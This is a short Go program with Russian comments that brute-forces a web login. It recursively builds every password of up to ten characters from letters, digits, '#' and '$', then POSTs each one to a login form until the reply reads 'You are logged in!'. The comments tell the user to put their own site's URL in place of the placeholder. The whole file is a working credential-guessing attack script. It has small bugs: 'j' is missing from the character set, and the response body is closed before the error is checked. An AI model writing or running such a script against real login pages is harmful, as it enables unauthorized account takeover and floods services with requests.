package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
)

//тут словарь по которому будет подбираться пароль рекурсивно
var library = []string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "g", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "#", "$"}
var test = []string{"v", "r", "#", "a"}

//сначала вызывается эта функция
func main() {

	for i := 0; i <= 10; i++ {
		sendPassword(library, i, "")
	}

}

func sendPassword(pass []string, length int, str string) {
	if length <= 0 {
		sendRequest(str)
		return
	}

	for _, val := range pass {
		sendPassword(pass, length-1, str+val)
	}
}

func sendRequest(password string) {
	formData := url.Values{
		"login":    {"login"},
		"password": {password},
	}

	fmt.Println(password)

	//Поменяйте значение на свой сайт
	resp, err := http.PostForm("http://password/", formData)
	if err != nil {
		fmt.Println("Error")
		fmt.Println(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error")
		fmt.Println(err)
	}

	if string(body) == "You are logged in!" {
		fmt.Println("password is ", password)
		os.Exit(1)
	}
}
